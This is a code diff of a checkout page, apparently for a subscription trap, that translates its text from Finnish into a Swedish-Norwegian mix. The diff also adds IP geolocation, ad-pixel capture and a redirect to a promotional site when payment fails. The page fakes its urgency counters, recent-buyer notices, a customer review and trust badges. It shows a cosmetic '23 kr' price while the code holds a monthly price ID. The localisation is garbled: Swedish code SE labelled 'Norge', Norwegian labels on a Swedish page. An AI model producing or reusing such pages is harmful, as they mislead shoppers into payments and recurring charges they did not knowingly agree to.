@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sv">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Turvallinen Kassa</title>
+  <title>Säker kassa</title>
   <!-- Prevent leaking full URLs to third parties -->
   <meta name="referrer" content="no-referrer">
 
@@ -116,13 +116,13 @@
   </style>
 </head>
 <body>
-  <div class="safe">SSL-turvallinen maksu</div>
+  <div class="safe">SSL-säker betalning</div>
 
   <div class="wrap">
     <div class="page-title">
-      Turvallinen Kassa <span style="font-size:18px">🔒</span>
+      Säker kassa <span style="font-size:18px">🔒</span>
       <span class="stars">★★★★★</span>
-      <span class="reviews">(2777 Arvostelua)</span>
+      <span class="reviews">(2777 recensioner)</span>
     </div>
 
     <div class="grid">
@@ -136,61 +136,61 @@
             <div id="heroTitle" style="font-weight:900"></div>
           </div>
 
-          <div class="h2">1. Tiedot</div>
+          <div class="h2">1. Information</div>
 
           <div class="form-grid">
             <div>
-              <div class="label">Etunimi</div>
+              <div class="label">Fornavn</div>
               <input id="firstName" class="input" placeholder="Jane" autocomplete="given-name">
             </div>
             <div>
-              <div class="label">Sukunimi</div>
+              <div class="label">Etternavn</div>
               <input id="lastName" class="input" placeholder="Doe" autocomplete="family-name">
             </div>
           </div>
 
           <div class="form-grid">
             <div style="grid-column:1 / -1">
-              <div class="label">Osoite</div>
-              <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Osoite">
+              <div class="label">Adresse</div>
+              <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Adresse">
             </div>
             <div>
-              <div class="label">Postinumero</div>
-              <input id="billingPostinumero" class="input" autocomplete="postal-code" placeholder="Postinumero">
+              <div class="label">Postnummer</div>
+              <input id="billingPostcode" class="input" autocomplete="postal-code" placeholder="Postnummer">
             </div>
             <div>
-              <div class="label">Kaupunki</div>
-              <input id="billingKaupunki" class="input" autocomplete="address-level2" placeholder="Kaupunki">
+              <div class="label">By</div>
+              <input id="billingCity" class="input" autocomplete="address-level2" placeholder="By">
             </div>
           </div>
 
           <div class="form-grid">
             <div>
-              <div class="label">Sähköposti</div>
-              <input id="emailInput" class="input" placeholder="you@example.com" type="email" autocomplete="email" required>
+              <div class="label">E-post</div>
+              <input id="emailInput" class="input" placeholder="du@example.com" type="email" autocomplete="email" required>
             </div>
             <div>
-              <div class="label">Maa</div>
+              <div class="label">Land</div>
               <!-- free text to keep your country→ISO conversion -->
-              <input id="billingMaa" class="input" placeholder="Maa">
+              <input id="billingCountry" class="input" placeholder="Land">
             </div>
           </div>
 
           <div class="form-grid">
             <div>
-              <div class="label">Maa calling code</div>
-              <select id="phonePrefix" class="select"><option value="+47">+47 — Norge</option></select>
+              <div class="label">Landskod</div>
+              <select id="phonePrefix" class="select" aria-label="Landskod"></select>
             </div>
             <div>
-              <div class="label">Puhelinnumero</div>
-              <input id="phoneNumber" class="input" inputmode="tel" placeholder="Puhelinnumerosi" autocomplete="tel-national">
+              <div class="label">Telefonnummer</div>
+              <input id="phoneNumber" class="input" inputmode="tel" placeholder="Ditt nummer" autocomplete="tel-national">
             </div>
           </div>
 
           <!-- Hidden full name field (keeps your existing payment code exactly the same) -->
           <input id="nameInput" class="input" style="display:none">
 
-          <button id="nextBtn" class="btn" type="button">Jatka</button>
+          <button id="nextBtn" class="btn" type="button">Fortsett</button>
 
           <div class="logos">
             <img src="/visa.png" alt="Visa">
@@ -202,17 +202,17 @@
 
         <!-- STEP 2: Payment -->
         <section id="step2" class="step" aria-hidden="true">
-          <div class="h2">2. Maksu</div>
-          <p class="sub">Korttitiedot salataan ja Stripe käsittelee ne.</p>
+          <div class="h2">2. Betalning</div>
+          <p class="sub">Kortuppgifterna krypteras och behandlas av Stripe.</p>
 
           <div class="form-grid-1">
             <div>
-              <div class="label">Kortin numero</div>
+              <div class="label">Kortnummer</div>
               <div id="card-number" class="el"></div>
             </div>
             <div class="form-grid">
               <div>
-                <div class="label">Voimassaolo</div>
+                <div class="label">Giltigt till</div>
                 <div id="card-expiry" class="el"></div>
               </div>
               <div>
@@ -225,22 +225,22 @@
           <div id="err" class="err" role="alert" aria-hidden="true"></div>
 
           <div style="display:flex; gap:10px; margin-top:12px">
-            <button id="backBtn" class="btn muted" style="width:40%" type="button">← Takaisin</button>
-            <button id="payNow" class="btn" style="width:60%" type="button">Maksa turvallisesti</button>
+            <button id="backBtn" class="btn muted" style="width:40%" type="button">← Tillbaka</button>
+            <button id="payNow" class="btn" style="width:60%" type="button">Betal säkert</button>
           </div>
 
-          <p class="sub" style="text-align:center; margin-top:10px">🔒 256-bit SSL -suojattu · Stripe</p>
+          <p class="sub" style="text-align:center; margin-top:10px">🔒 256-bitars SSL-skydd · Drivs av Stripe</p>
         </section>
       </div>
 
       <!-- RIGHT: SIDEBAR -->
       <aside>
         <div class="widget">
-          <div class="w-title" style="text-align:center">Asiakkaamme sanovat</div>
+          <div class="w-title" style="text-align:center">Vad våra kunder säger</div>
           <div style="text-align:center; font-weight:700; margin-bottom:4px">Fenella Lara</div>
           <div style="text-align:center; color:#f6b80c; letter-spacing:1px">★★★★★</div>
           <p class="tiny" style="text-align:center; margin-top:8px">
-            I received my product yesterday. Fast and outstanding customer service! Thanks a lot.
+            Jag fick min produkt igår. Snabb och fantastisk kundservice! Tack så mycket.
           </p>
         </div>
 
@@ -248,37 +248,37 @@
           <div class="delivery">
             <img id="sidebarImg" alt="">
             <div>
-              <div style="font-weight:800">Nopea toimitus kotiisi</div>
-              <div class="tiny">3–5 arkipäivää</div>
+              <div style="font-weight:800">Rask levering till din adress</div>
+              <div class="tiny">3–5 arbetsdagar</div>
             </div>
-            <div style="margin-left:auto; font-weight:800">Ilmainen</div>
+            <div style="margin-left:auto; font-weight:800">Gratis</div>
           </div>
 
-          <div class="w-title" style="margin-top:14px">Tilausyhteenveto</div>
-          <div class="order-row"><span>Yhteensä</span><span id="orderYhteensä">23 kr</span></div>
+          <div class="w-title" style="margin-top:14px">Orderöversikt</div>
+          <div class="order-row"><span>Totalt</span><span id="orderTotal">23 kr</span></div>
 
           <div class="tiny" style="margin-top:10px; line-height:1.5">
-            🗃️ Vain 13 jäljellä varastossa<br>
-            👀 <span id="viewingNow">31</span> katsoo tätä juuri nyt<br>
-            ✅ <span id="recentBuyer">J****s</span> osti tämän (10 minutes ago)<br>
-            💳 <span id="purchasedCount">715</span> ostanut tämän viimeisten 7 päivän aikana
+            🗃️ Endast 13 kvar i lager<br>
+            👀 <span id="viewingNow">31</span> personer tittar på detta just nu<br>
+            ✅ <span id="recentBuyer">J****s</span> fick detta (för 10 minuter sedan)<br>
+            💳 <span id="purchasedCount">715</span> personer köpte detta de senaste 7 dagarna
           </div>
         </div>
 
         <div class="widget">
-          <div class="w-title">TRUSTED STORE</div>
+          <div class="w-title">BETRODD BUTIK</div>
           <div class="trust">
             <div class="box">
               <div class="big">99%</div>
-              <div class="small">Tyytyväisiä asiakkaita</div>
+              <div class="small">Nöjda kunder</div>
             </div>
             <div class="box">
-              <div class="big">Turvallinen</div>
-              <div class="small">SSL-salattu</div>
+              <div class="big">Säker</div>
+              <div class="small">SSL-krypterad</div>
             </div>
             <div class="box">
               <div class="big">$10K</div>
-              <div class="small">Ostajansuoja</div>
+              <div class="small">Köparskydd</div>
             </div>
           </div>
         </div>
@@ -289,9 +289,9 @@
   <!-- Loading overlay -->
   <div id="loading-overlay" class="loading-overlay" aria-hidden="true" style="display:none">
     <div class="loading-box">
-      <div class="loading-title">Maksua käsitellään…</div>
+      <div class="loading-title">Bearbetar din betalning…</div>
       <div class="progress-wrap"><div class="progress-bar"></div></div>
-      <p class="sub" style="margin-top:10px">Odota hetki, tämä voi kestää muutaman sekunnin.</p>
+      <p class="sub" style="margin-top:10px">Vänligen vänta, detta kan ta några sekunder.</p>
     </div>
   </div>
 
@@ -299,6 +299,9 @@
   <script src="https://js.stripe.com/v3"></script>
   <script>
     window.addEventListener('DOMContentLoaded', () => {
+// Capture FB pixel from URL
+const mainQS = new URLSearchParams(window.location.search);
+const fbPixel = mainQS.get('pixel') || "";
       // ----- DOM -----
       const step1 = document.getElementById('step1');
       const step2 = document.getElementById('step2');
@@ -314,11 +317,11 @@
       const phoneNumber = document.getElementById('phoneNumber');
 
       const billingStreet = document.getElementById('billingStreet');
-      const billingKaupunki = document.getElementById('billingKaupunki');
-      const billingMaa = document.getElementById('billingMaa'); // free text
-      const billingPostinumero = document.getElementById('billingPostinumero');
+      const billingCity = document.getElementById('billingCity');
+      const billingCountry = document.getElementById('billingCountry'); // free text
+      const billingPostcode = document.getElementById('billingPostcode');
 
-      const orderYhteensä = document.getElementById('orderYhteensä');
+      const orderTotal = document.getElementById('orderTotal');
       const sidebarImg = document.getElementById('sidebarImg');
 
       // Keep your existing endpoints / keys (UNCHANGED)
@@ -329,8 +332,8 @@
       const MONTHLY_PRICE_ID = "price_1RvJmqEJXIhiKzYGE0IJQp7t";
 
       // Display price like screenshot (purely cosmetic)
-      const INTRO_PRICE_TEXT = "23 kr";
-      try { orderYhteensä.textContent = INTRO_PRICE_TEXT; } catch {}
+      const INTRO_PRICE_TEXT = '23 kr';
+      try { orderTotal.textContent = INTRO_PRICE_TEXT; } catch {}
 
       function show(o){ o?.setAttribute('aria-hidden','false'); }
       function hide(o){ o?.setAttribute('aria-hidden','true'); }
@@ -366,15 +369,27 @@
         if (showHero) hero.style.display = 'flex';
       })();
 
-      // ===== Maa choices + calling codes =====
-      const COUNTRY_CHOICES = { NO: "Norge" };
-      const CALLING_CODES = { NO: "+47" };
-      function populatePrefixOptions(){ phonePrefix.innerHTML = ""; phonePrefix.append(new Option("+47 — Norge", "+47")); } — ${COUNTRY_CHOICES[cc] || cc}`;
+      // ===== Country choices + calling codes =====
+      const COUNTRY_CHOICES = {
+        SE:'Norge'
+      };
+      const CALLING_CODES = {
+        SE:'+46'
+      };
+      function populatePrefixOptions(){
+        phonePrefix.innerHTML = '';
+        const priority = ['SE'];
+        const seen = new Set();
+        const add = (cc) => {
+          if (seen.has(cc) || !CALLING_CODES[cc]) return;
+          seen.add(cc);
+          const code = CALLING_CODES[cc];
+          const label = `${code} — ${COUNTRY_CHOICES[cc] || cc}`;
           phonePrefix.append(new Option(label, code));
         };
         priority.forEach(add);
         Object.keys(CALLING_CODES).filter(cc => !priority.includes(cc)).sort().forEach(add);
-        if (!phonePrefix.value) phonePrefix.value = CALLING_CODES.US;
+        if (!phonePrefix.value) phonePrefix.value = CALLING_CODES.SE;
       }
       function setPrefixFromISO(cc){ const code = CALLING_CODES[cc]; if(!code) return;
         const exists = Array.from(phonePrefix.options).some(o=>o.value===code);
@@ -388,7 +403,7 @@
         if(!exists) phonePrefix.add(new Option(c, c));
         phonePrefix.value = c;
       }
-      function normalizeMaaShorthand(val){
+      function normalizeCountryShorthand(val){
         const v = String(val||'').toUpperCase().replace(/\./g,'').trim();
         const map = { UK:'GB', ENGLAND:'GB', SCOTLAND:'GB', WALES:'GB', USA:'US', UNITEDSTATES:'US', UAE:'AE', KSA:'SA' };
         return map[v] || null;
@@ -397,7 +412,7 @@
         if(!text) return null;
         const raw = text.trim(); const isoLike = raw.toUpperCase();
         if (isoLike.length === 2 && COUNTRY_CHOICES[isoLike]) return isoLike;
-        const shorthand = normalizeMaaShorthand(raw); if (shorthand && COUNTRY_CHOICES[shorthand]) return shorthand;
+        const shorthand = normalizeCountryShorthand(raw); if (shorthand && COUNTRY_CHOICES[shorthand]) return shorthand;
         const lower = raw.toLowerCase();
         let match = Object.entries(COUNTRY_CHOICES).find(([code,name]) => name.toLowerCase() === lower);
         if(!match){ match = Object.entries(COUNTRY_CHOICES).find(([code,name]) => name.toLowerCase().startsWith(lower)); }
@@ -439,32 +454,49 @@
         }
       }
 
-      function applyOsoitePrefill(){
+      function applyAddressPrefill(){
         if (urlPrefs.street){ billingStreet.value = decodeURIComponent(urlPrefs.street); }
-        if (urlPrefs.post){   billingPostinumero.value = decodeURIComponent(urlPrefs.post); }
-        if (urlPrefs.city){   billingKaupunki.value = decodeURIComponent(urlPrefs.city); }
+        if (urlPrefs.post){   billingPostcode.value = decodeURIComponent(urlPrefs.post); }
+        if (urlPrefs.city){   billingCity.value = decodeURIComponent(urlPrefs.city); }
         if (urlPrefs.country){
           const text = decodeURIComponent(urlPrefs.country);
-          billingMaa.value = text;
+          billingCountry.value = text;
           const iso = countryTextToISO(text);
           if (iso) setPrefixFromISO(iso);
         }
       }
 
       applyContactPrefill();
-      applyOsoitePrefill();
+      applyAddressPrefill();
 
       // ---- IP-based prefix ONLY (does not touch city/country fields) ----
-      (function hydratePrefixFromIP(){})();
+      (function hydratePrefixFromIP(){
+        if (prefixLockedFromURL) return; // respect URL-provided phone
+        const withTimeout = (ms,p)=>Promise.race([p,new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),ms))]);
+        const guessISO = ()=>{ const cc=(navigator.language||'').split('-')[1]; return cc?cc.toUpperCase():null; };
+        (async () => {
+          try{
+            const try1=()=>withTimeout(2000, fetch('https://ipapi.co/json/').then(r=>r.json()));
+            const try2=()=>withTimeout(2000, fetch('https://ipwho.is/?fields=country,country_code').then(r=>r.json()));
+            const try3=()=>withTimeout(2000, fetch('https://ipinfo.io/json').then(r=>r.json()));
+            let d=null; try{ d=await try1(); }catch{} if(!d||d.error){ try{ d=await try2(); }catch{} } if(!d||d.error){ try{ d=await try3(); }catch{} }
+            let iso = (d && (d.country_code || d.countryCode)) ? String(d.country_code || d.countryCode).toUpperCase() : null;
+            if(!iso) iso = guessISO();
+            if(iso) setPrefixFromISO(iso);
+          }catch{
+            const iso = guessISO();
+            if(iso) setPrefixFromISO(iso);
+          }
+        })();
       })();
 
       // Sync prefix when user edits country
-      function maybeSyncPrefixFromMaa(){
-        const iso = countryTextToISO(billingMaa.value);
+      function maybeSyncPrefixFromCountry(){
+        const iso = countryTextToISO(billingCountry.value);
         if (iso) setPrefixFromISO(iso);
       }
-      billingMaa.addEventListener('change', maybeSyncPrefixFromMaa);
-      billingMaa.addEventListener('blur',   maybeSyncPrefixFromMaa);
+      billingCountry.addEventListener('change', maybeSyncPrefixFromCountry);
+      billingCountry.addEventListener('blur',   maybeSyncPrefixFromCountry);
 
       // =========================
       // ADSCURB DSP: load real script tag on Step 1 only
@@ -515,7 +547,7 @@
       }catch(e){ console.warn('Stripe init skipped:', e); }
 
       document.getElementById('payNow')?.addEventListener('click', async ()=>{
-        if(!stripe){ alert('Payment temporarily unavailable. Please try again.'); return; }
+        if(!stripe){ alert('Betalning är tillfälligt otillgänglig. Försök igen.'); return; }
         errBox?.setAttribute('aria-hidden','true'); if(errBox) errBox.textContent='';
         showLoading();
 
@@ -524,7 +556,7 @@
         const raw = (phoneNumber?.value || '').replace(/[^0-9]/g,'');
         const fullPhone = raw ? ((phonePrefix?.value||'') + raw) : undefined;
 
-        const isoMaa = (function countryTextToISO(text){
+        const isoCountry = (function countryTextToISO(text){
           if(!text) return null;
           const raw = text.trim(); const isoLike = raw.toUpperCase();
           if (isoLike.length === 2 && COUNTRY_CHOICES[isoLike]) return isoLike;
@@ -535,13 +567,13 @@
           let match = Object.entries(COUNTRY_CHOICES).find(([code,name]) => name.toLowerCase() === lower)
                   || Object.entries(COUNTRY_CHOICES).find(([code,name]) => name.toLowerCase().startsWith(lower));
           return match ? match[0] : null;
-        })(billingMaa?.value) || undefined;
+        })(billingCountry?.value) || undefined;
 
         const address = {
           line1: (billingStreet?.value||'').trim() || undefined,
-          city: (billingKaupunki?.value||'').trim() || undefined,
-          country: isoMaa,
-          postal_code: (billingPostinumero?.value||'').trim() || undefined
+          city: (billingCity?.value||'').trim() || undefined,
+          country: isoCountry,
+          postal_code: (billingPostcode?.value||'').trim() || undefined
         };
 
         try{
@@ -559,12 +591,12 @@
             body: JSON.stringify({ paymentMethodId: pmRes.paymentMethod.id, name, email, phone: fullPhone, address })
           });
           const data = await resp.json();
-          if(!data.clientSecret) throw new Error(data.error || 'Payment failed to start');
+          if(!data.clientSecret) throw new Error(data.error || 'Betalningen kunde inte startas');
 
           // 3) Confirm the intro charge (handles 3DS/SCA)
           const conf = await stripe.confirmCardPayment(data.clientSecret);
           if(conf.error) throw new Error(conf.error.message);
-          if(!(conf.paymentIntent && conf.paymentIntent.status==='succeeded')) throw new Error('Payment not completed');
+          if(!(conf.paymentIntent && conf.paymentIntent.status==='succeeded')) throw new Error('Betalningen slutfördes inte');
 
           // Success → thank you via BeMob tracker (no split)
           (function(){
@@ -588,10 +620,10 @@
           })();
 
         }catch(err){
-          if(errBox){ errBox.textContent = err.message || 'Something went wrong.'; errBox.setAttribute('aria-hidden','false'); }
+          if(errBox){ errBox.textContent = err.message || 'Något gick fel.'; errBox.setAttribute('aria-hidden','false'); }
           hideLoading();
           /* ONLY CHANGE: redirect on failure, matching blank.html */
-          window.location.href = 'https://www.united-defence-shield.com/7GQSPJ/27CC71Q';
+          window.location.href = 'https://hitnspinpromo.com/l/691641a05632887c800e6cd2?sub_id={sub_id_1}';
         }
       });
     });
